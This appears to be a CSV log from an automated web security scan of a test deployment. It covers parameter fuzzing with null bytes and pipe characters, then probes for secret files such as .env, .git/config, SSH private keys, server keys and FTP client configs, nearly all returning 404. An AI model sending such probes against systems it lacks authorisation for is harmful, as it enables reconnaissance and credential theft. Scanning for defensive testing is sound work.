ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5383,Mon Sep 07 03:11:48 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%7C,200,OK,523,429,1033
5384,Mon Sep 07 03:11:48 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%40,200,OK,523,429,1101
5385,Mon Sep 07 03:11:48 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%7C,200,OK,679,429,1036
5386,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&=,200,OK,515,428,284
5387,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=tXyZJ52UQVBCVsD3,200,OK,513,429,1100
5388,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%2B,200,OK,533,429,1100
5389,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2B,200,OK,525,428,274
5390,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%2B,200,OK,509,429,1100
5391,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%00,200,OK,861,429,1033
5392,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%2B,200,OK,502,429,1101
5393,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,534,429,1100
5394,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=,200,OK,487,428,282
5395,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?=,200,OK,519,429,1114
5396,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%00,200,OK,550,429,1100
5397,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%00,200,OK,518,428,274
5398,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%00,200,OK,534,429,1100
5399,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%00,200,OK,516,429,1101
5400,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?=,200,OK,528,429,1114
5401,Mon Sep 07 03:11:51 BDT 2026,Mon Sep 07 03:11:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%40,200,OK,518,428,282
5402,Mon Sep 07 03:11:51 BDT 2026,Mon Sep 07 03:11:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=,200,OK,521,429,1100
5403,Mon Sep 07 03:11:51 BDT 2026,Mon Sep 07 03:11:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%7C,200,OK,522,429,1100
5404,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%7C,200,OK,956,429,1033
5405,Mon Sep 07 03:11:51 BDT 2026,Mon Sep 07 03:11:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%7C,200,OK,520,428,274
5406,Mon Sep 07 03:11:51 BDT 2026,Mon Sep 07 03:11:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%7C,200,OK,518,429,1100
5407,Mon Sep 07 03:11:51 BDT 2026,Mon Sep 07 03:11:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%7C,200,OK,520,429,1101
5408,Mon Sep 07 03:11:51 BDT 2026,Mon Sep 07 03:11:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=,200,OK,536,429,1100
5409,Mon Sep 07 03:11:52 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,526,429,1100
5410,Mon Sep 07 03:11:52 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1102
5411,Mon Sep 07 03:11:52 BDT 2026,Mon Sep 07 03:11:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%2B,200,OK,496,428,282
5412,Mon Sep 07 03:11:52 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,542,429,1100
5413,Mon Sep 07 03:11:52 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,542,429,1100
5414,Mon Sep 07 03:11:52 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,542,429,1100
5415,Mon Sep 07 03:11:52 BDT 2026,Mon Sep 07 03:11:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%40,200,OK,538,429,1100
5416,Mon Sep 07 03:11:53 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%40,200,OK,495,429,1100
5417,Mon Sep 07 03:11:53 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?=,200,OK,502,429,1116
5418,Mon Sep 07 03:11:53 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%2B,200,OK,458,429,1100
5419,Mon Sep 07 03:11:53 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?=,200,OK,512,429,1114
5420,Mon Sep 07 03:11:53 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%00,200,OK,533,428,282
5421,Mon Sep 07 03:11:53 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?=,200,OK,531,429,1114
5422,Mon Sep 07 03:11:53 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?=,200,OK,515,429,1114
5423,Mon Sep 07 03:11:53 BDT 2026,Mon Sep 07 03:11:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?=,200,OK,531,429,1114
5424,Mon Sep 07 03:11:54 BDT 2026,Mon Sep 07 03:11:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%2B,200,OK,531,429,1100
5425,Mon Sep 07 03:11:54 BDT 2026,Mon Sep 07 03:11:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=,200,OK,556,429,1102
5426,Mon Sep 07 03:11:54 BDT 2026,Mon Sep 07 03:11:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%00,200,OK,525,429,1100
5427,Mon Sep 07 03:11:54 BDT 2026,Mon Sep 07 03:11:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=,200,OK,524,429,1100
5428,Mon Sep 07 03:11:54 BDT 2026,Mon Sep 07 03:11:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%7C,200,OK,509,428,282
5429,Mon Sep 07 03:11:54 BDT 2026,Mon Sep 07 03:11:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=,200,OK,509,429,1100
5430,Mon Sep 07 03:11:54 BDT 2026,Mon Sep 07 03:11:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=,200,OK,547,429,1100
5431,Mon Sep 07 03:11:54 BDT 2026,Mon Sep 07 03:11:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=,200,OK,531,429,1100
5432,Mon Sep 07 03:11:55 BDT 2026,Mon Sep 07 03:11:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,664,429,1100
5433,Mon Sep 07 03:11:55 BDT 2026,Mon Sep 07 03:11:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%00,200,OK,518,429,1100
5434,Mon Sep 07 03:11:55 BDT 2026,Mon Sep 07 03:11:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=%7C,200,OK,500,429,1100
5435,Mon Sep 07 03:11:55 BDT 2026,Mon Sep 07 03:11:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%40,200,OK,549,429,1102
5436,Mon Sep 07 03:11:55 BDT 2026,Mon Sep 07 03:11:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%40,200,OK,527,429,1100
5437,Mon Sep 07 03:11:55 BDT 2026,Mon Sep 07 03:11:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%40,200,OK,508,429,1100
5438,Mon Sep 07 03:11:55 BDT 2026,Mon Sep 07 03:11:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%40,200,OK,534,429,1100
5439,Mon Sep 07 03:11:55 BDT 2026,Mon Sep 07 03:11:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%40,200,OK,534,429,1100
5440,Mon Sep 07 03:11:56 BDT 2026,Mon Sep 07 03:11:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?=,200,OK,579,429,1114
5441,Mon Sep 07 03:11:56 BDT 2026,Mon Sep 07 03:11:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=%7C,200,OK,519,429,1100
5442,Mon Sep 07 03:11:56 BDT 2026,Mon Sep 07 03:11:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%2B,200,OK,531,429,1102
5443,Mon Sep 07 03:11:56 BDT 2026,Mon Sep 07 03:11:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%2B,200,OK,499,429,1100
5444,Mon Sep 07 03:11:56 BDT 2026,Mon Sep 07 03:11:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%2B,200,OK,531,429,1100
5445,Mon Sep 07 03:11:56 BDT 2026,Mon Sep 07 03:11:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%2B,200,OK,515,429,1100
5446,Mon Sep 07 03:11:56 BDT 2026,Mon Sep 07 03:11:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%2B,200,OK,531,429,1100
5447,Mon Sep 07 03:11:57 BDT 2026,Mon Sep 07 03:11:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=,200,OK,514,429,1100
5448,Mon Sep 07 03:11:57 BDT 2026,Mon Sep 07 03:11:57 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%00,200,OK,528,429,1102
5449,Mon Sep 07 03:11:57 BDT 2026,Mon Sep 07 03:11:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%00,200,OK,541,429,1100
5450,Mon Sep 07 03:11:57 BDT 2026,Mon Sep 07 03:11:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%00,200,OK,505,429,1100
5451,Mon Sep 07 03:11:57 BDT 2026,Mon Sep 07 03:11:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%00,200,OK,520,429,1100
5452,Mon Sep 07 03:11:57 BDT 2026,Mon Sep 07 03:11:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%00,200,OK,520,429,1100
5453,Mon Sep 07 03:11:58 BDT 2026,Mon Sep 07 03:11:58 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%40,200,OK,581,429,1100
5454,Mon Sep 07 03:11:58 BDT 2026,Mon Sep 07 03:11:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=%7C,200,OK,518,429,1102
5455,Mon Sep 07 03:11:58 BDT 2026,Mon Sep 07 03:11:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=%7C,200,OK,534,429,1100
5456,Mon Sep 07 03:11:58 BDT 2026,Mon Sep 07 03:11:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=%7C,200,OK,534,429,1100
5457,Mon Sep 07 03:11:58 BDT 2026,Mon Sep 07 03:11:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=%7C,200,OK,534,429,1100
5458,Mon Sep 07 03:11:58 BDT 2026,Mon Sep 07 03:11:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=%7C,200,OK,534,429,1100
5459,Mon Sep 07 03:11:59 BDT 2026,Mon Sep 07 03:11:59 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%2B,200,OK,515,429,1100
5460,Mon Sep 07 03:12:00 BDT 2026,Mon Sep 07 03:12:00 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%00,200,OK,529,429,1100
5461,Mon Sep 07 03:12:01 BDT 2026,Mon Sep 07 03:12:02 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=%7C,200,OK,574,429,1100
5462,Mon Sep 07 03:12:02 BDT 2026,Mon Sep 07 03:12:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/elmah.axd,404,Not Found,522,436,1090
5463,Mon Sep 07 03:12:02 BDT 2026,Mon Sep 07 03:12:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app/trace.axd,404,Not Found,553,436,1090
5464,Mon Sep 07 03:12:02 BDT 2026,Mon Sep 07 03:12:03 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,909,534,49517
5465,Mon Sep 07 03:12:03 BDT 2026,Mon Sep 07 03:12:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,528,361,9
5466,Mon Sep 07 03:12:04 BDT 2026,Mon Sep 07 03:12:04 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,494,361,9
5467,Mon Sep 07 03:12:04 BDT 2026,Mon Sep 07 03:12:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/trace.axd,404,Not Found,522,361,9
5468,Mon Sep 07 03:12:04 BDT 2026,Mon Sep 07 03:12:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,538,361,9
5469,Mon Sep 07 03:12:05 BDT 2026,Mon Sep 07 03:12:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/trace.axd,404,Not Found,489,361,9
5470,Mon Sep 07 03:12:05 BDT 2026,Mon Sep 07 03:12:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks/trace.axd,404,Not Found,505,361,9
5471,Mon Sep 07 03:12:05 BDT 2026,Mon Sep 07 03:12:05 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,490,435,271
5472,Mon Sep 07 03:12:05 BDT 2026,Mon Sep 07 03:12:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/trace.axd,307,Temporary Redirect,508,287,0
5473,Mon Sep 07 03:12:06 BDT 2026,Mon Sep 07 03:12:06 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.htaccess,404,Not Found,547,436,1090
5474,Mon Sep 07 03:12:06 BDT 2026,Mon Sep 07 03:12:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,850,534,49517
5475,Mon Sep 07 03:12:07 BDT 2026,Mon Sep 07 03:12:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,504,361,9
5476,Mon Sep 07 03:12:07 BDT 2026,Mon Sep 07 03:12:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,491,361,9
5477,Mon Sep 07 03:12:08 BDT 2026,Mon Sep 07 03:12:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,547,361,9
5478,Mon Sep 07 03:12:08 BDT 2026,Mon Sep 07 03:12:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/.htaccess,404,Not Found,547,361,9
5479,Mon Sep 07 03:12:08 BDT 2026,Mon Sep 07 03:12:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks/.htaccess,404,Not Found,520,361,9
5480,Mon Sep 07 03:12:08 BDT 2026,Mon Sep 07 03:12:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,520,435,271
5481,Mon Sep 07 03:12:08 BDT 2026,Mon Sep 07 03:12:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/.htaccess,404,Not Found,535,361,9
5482,Mon Sep 07 03:12:09 BDT 2026,Mon Sep 07 03:12:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/.htaccess,307,Temporary Redirect,535,287,0
5483,Mon Sep 07 03:12:09 BDT 2026,Mon Sep 07 03:12:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.env,404,Not Found,538,436,1090
5484,Mon Sep 07 03:12:09 BDT 2026,Mon Sep 07 03:12:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,866,534,49517
5485,Mon Sep 07 03:12:10 BDT 2026,Mon Sep 07 03:12:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,518,361,9
5486,Mon Sep 07 03:12:11 BDT 2026,Mon Sep 07 03:12:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,520,361,9
5487,Mon Sep 07 03:12:11 BDT 2026,Mon Sep 07 03:12:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,514,361,9
5488,Mon Sep 07 03:12:11 BDT 2026,Mon Sep 07 03:12:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/.env,404,Not Found,545,361,9
5489,Mon Sep 07 03:12:12 BDT 2026,Mon Sep 07 03:12:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks/.env,404,Not Found,526,361,9
5490,Mon Sep 07 03:12:12 BDT 2026,Mon Sep 07 03:12:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,510,435,271
5491,Mon Sep 07 03:12:12 BDT 2026,Mon Sep 07 03:12:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/.env,404,Not Found,541,361,9
5492,Mon Sep 07 03:12:12 BDT 2026,Mon Sep 07 03:12:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/.env,307,Temporary Redirect,529,282,0
5493,Mon Sep 07 03:12:13 BDT 2026,Mon Sep 07 03:12:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/actuator/health,404,Not Found,492,436,1090
5494,Mon Sep 07 03:12:13 BDT 2026,Mon Sep 07 03:12:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/zap8813806844887448699,404,Not Found,524,436,1090
5495,Mon Sep 07 03:12:13 BDT 2026,Mon Sep 07 03:12:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,914,534,49517
5496,Mon Sep 07 03:12:13 BDT 2026,Mon Sep 07 03:12:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/actuator/health,404,Not Found,518,436,1090
5497,Mon Sep 07 03:12:13 BDT 2026,Mon Sep 07 03:12:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.zap8812515474700587743,404,Not Found,530,436,1090
5498,Mon Sep 07 03:12:14 BDT 2026,Mon Sep 07 03:12:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,548,361,9
5499,Mon Sep 07 03:12:14 BDT 2026,Mon Sep 07 03:12:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/lfm.php,404,Not Found,528,436,1090
5500,Mon Sep 07 03:12:14 BDT 2026,Mon Sep 07 03:12:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,518,361,9
5501,Mon Sep 07 03:12:14 BDT 2026,Mon Sep 07 03:12:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.idea/WebServers.xml,404,Not Found,506,436,1090
5502,Mon Sep 07 03:12:15 BDT 2026,Mon Sep 07 03:12:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,537,361,9
5503,Mon Sep 07 03:12:15 BDT 2026,Mon Sep 07 03:12:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/config/databases.yml,404,Not Found,489,436,1090
5504,Mon Sep 07 03:12:15 BDT 2026,Mon Sep 07 03:12:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,496,435,271
5505,Mon Sep 07 03:12:15 BDT 2026,Mon Sep 07 03:12:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/config/database.yml,404,Not Found,543,436,1090
5506,Mon Sep 07 03:12:16 BDT 2026,Mon Sep 07 03:12:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.git/config,404,Not Found,517,436,1090
5507,Mon Sep 07 03:12:16 BDT 2026,Mon Sep 07 03:12:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.svn/entries,404,Not Found,508,436,1090
5508,Mon Sep 07 03:12:17 BDT 2026,Mon Sep 07 03:12:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.svn/wc.db,404,Not Found,523,436,1090
5509,Mon Sep 07 03:12:17 BDT 2026,Mon Sep 07 03:12:18 BDT 2026,GET,https://tfctest-002-production.up.railway.app/CVS/root,404,Not Found,520,436,1090
5510,Mon Sep 07 03:12:18 BDT 2026,Mon Sep 07 03:12:19 BDT 2026,GET,https://tfctest-002-production.up.railway.app/server-status,404,Not Found,517,436,1090
5511,Mon Sep 07 03:12:19 BDT 2026,Mon Sep 07 03:12:19 BDT 2026,GET,https://tfctest-002-production.up.railway.app/core,404,Not Found,536,436,1090
5512,Mon Sep 07 03:12:19 BDT 2026,Mon Sep 07 03:12:20 BDT 2026,GET,https://tfctest-002-production.up.railway.app/sftp-config.json,404,Not Found,521,436,1090
5513,Mon Sep 07 03:12:20 BDT 2026,Mon Sep 07 03:12:20 BDT 2026,GET,https://tfctest-002-production.up.railway.app/WS_FTP.ini,404,Not Found,503,436,1090
5514,Mon Sep 07 03:12:20 BDT 2026,Mon Sep 07 03:12:21 BDT 2026,GET,https://tfctest-002-production.up.railway.app/ws_ftp.ini,404,Not Found,537,436,1090
5515,Mon Sep 07 03:12:21 BDT 2026,Mon Sep 07 03:12:21 BDT 2026,GET,https://tfctest-002-production.up.railway.app/WS_FTP.INI,404,Not Found,514,436,1090
5516,Mon Sep 07 03:12:21 BDT 2026,Mon Sep 07 03:12:22 BDT 2026,GET,https://tfctest-002-production.up.railway.app/filezilla.xml,404,Not Found,514,436,1090
5517,Mon Sep 07 03:12:22 BDT 2026,Mon Sep 07 03:12:22 BDT 2026,GET,https://tfctest-002-production.up.railway.app/sitemanager.xml,404,Not Found,517,436,1090
5518,Mon Sep 07 03:12:22 BDT 2026,Mon Sep 07 03:12:23 BDT 2026,GET,https://tfctest-002-production.up.railway.app/FileZilla.xml,404,Not Found,517,436,1090
5519,Mon Sep 07 03:12:23 BDT 2026,Mon Sep 07 03:12:23 BDT 2026,GET,https://tfctest-002-production.up.railway.app/winscp.ini,404,Not Found,524,436,1090
5520,Mon Sep 07 03:12:23 BDT 2026,Mon Sep 07 03:12:24 BDT 2026,GET,https://tfctest-002-production.up.railway.app/WinSCP.ini,404,Not Found,520,436,1090
5521,Mon Sep 07 03:12:24 BDT 2026,Mon Sep 07 03:12:24 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.DS_Store,404,Not Found,512,436,1090
5522,Mon Sep 07 03:12:24 BDT 2026,Mon Sep 07 03:12:25 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.php_cs.cache,404,Not Found,538,436,1090
5523,Mon Sep 07 03:12:25 BDT 2026,Mon Sep 07 03:12:25 BDT 2026,GET,https://tfctest-002-production.up.railway.app/DEADJOE,404,Not Found,517,436,1090
5524,Mon Sep 07 03:12:25 BDT 2026,Mon Sep 07 03:12:26 BDT 2026,GET,https://tfctest-002-production.up.railway.app/sites/default/private/files/backup_migrate/scheduled/test.txt,404,Not Found,550,436,1090
5525,Mon Sep 07 03:12:26 BDT 2026,Mon Sep 07 03:12:26 BDT 2026,GET,https://tfctest-002-production.up.railway.app/app/etc/local.xml,404,Not Found,533,436,1090
5526,Mon Sep 07 03:12:26 BDT 2026,Mon Sep 07 03:12:27 BDT 2026,GET,https://tfctest-002-production.up.railway.app/server.key,404,Not Found,526,436,1090
5527,Mon Sep 07 03:12:27 BDT 2026,Mon Sep 07 03:12:27 BDT 2026,GET,https://tfctest-002-production.up.railway.app/privatekey.key,404,Not Found,514,436,1090
5528,Mon Sep 07 03:12:27 BDT 2026,Mon Sep 07 03:12:28 BDT 2026,GET,https://tfctest-002-production.up.railway.app/myserver.key,404,Not Found,501,436,1090
5529,Mon Sep 07 03:12:28 BDT 2026,Mon Sep 07 03:12:28 BDT 2026,GET,https://tfctest-002-production.up.railway.app/key.pem,404,Not Found,517,436,1090
5530,Mon Sep 07 03:12:28 BDT 2026,Mon Sep 07 03:12:29 BDT 2026,GET,https://tfctest-002-production.up.railway.app/id_rsa,404,Not Found,526,436,1090
5531,Mon Sep 07 03:12:29 BDT 2026,Mon Sep 07 03:12:30 BDT 2026,GET,https://tfctest-002-production.up.railway.app/id_dsa,404,Not Found,540,436,1090
5532,Mon Sep 07 03:12:30 BDT 2026,Mon Sep 07 03:12:30 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.ssh/id_rsa,404,Not Found,504,436,1090
5533,Mon Sep 07 03:12:30 BDT 2026,Mon Sep 07 03:12:31 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.ssh/id_dsa,404,Not Found,564,436,1090
5534,Mon Sep 07 03:12:31 BDT 2026,Mon Sep 07 03:12:31 BDT 2026,GET,https://tfctest-002-production.up.railway.app/adminer.php,404,Not Found,496,436,1090
5535,Mon Sep 07 03:12:31 BDT 2026,Mon Sep 07 03:12:32 BDT 2026,GET,https://tfctest-002-production.up.railway.app/vb_test.php,404,Not Found,541,436,1090
5536,Mon Sep 07 03:12:32 BDT 2026,Mon Sep 07 03:12:32 BDT 2026,GET,https://tfctest-002-production.up.railway.app/CHANGELOG.txt,404,Not Found,518,436,1090
5537,Mon Sep 07 03:12:32 BDT 2026,Mon Sep 07 03:12:33 BDT 2026,GET,https://tfctest-002-production.up.railway.app/sites/default/files/.ht.sqlite,404,Not Found,533,436,1090
5538,Mon Sep 07 03:12:33 BDT 2026,Mon Sep 07 03:12:33 BDT 2026,GET,https://tfctest-002-production.up.railway.app/composer.json,404,Not Found,548,436,1090
5539,Mon Sep 07 03:12:33 BDT 2026,Mon Sep 07 03:12:34 BDT 2026,GET,https://tfctest-002-production.up.railway.app/composer.lock,404,Not Found,536,436,1090
5540,Mon Sep 07 03:12:34 BDT 2026,Mon Sep 07 03:12:34 BDT 2026,GET,https://tfctest-002-production.up.railway.app/vim_settings.xml,404,Not Found,513,436,1090
5541,Mon Sep 07 03:12:34 BDT 2026,Mon Sep 07 03:12:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/server-info,404,Not Found,520,436,1090
5542,Mon Sep 07 03:12:35 BDT 2026,Mon Sep 07 03:12:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/phpinfo.php,404,Not Found,517,436,1090
5543,Mon Sep 07 03:12:35 BDT 2026,Mon Sep 07 03:12:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/info.php,404,Not Found,530,436,1090
5544,Mon Sep 07 03:12:36 BDT 2026,Mon Sep 07 03:12:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/i.php,404,Not Found,497,436,1090
5545,Mon Sep 07 03:12:36 BDT 2026,Mon Sep 07 03:12:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/test.php,404,Not Found,517,436,1090
5546,Mon Sep 07 03:12:37 BDT 2026,Mon Sep 07 03:12:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_wpeprivate/config.json,404,Not Found,534,436,1090
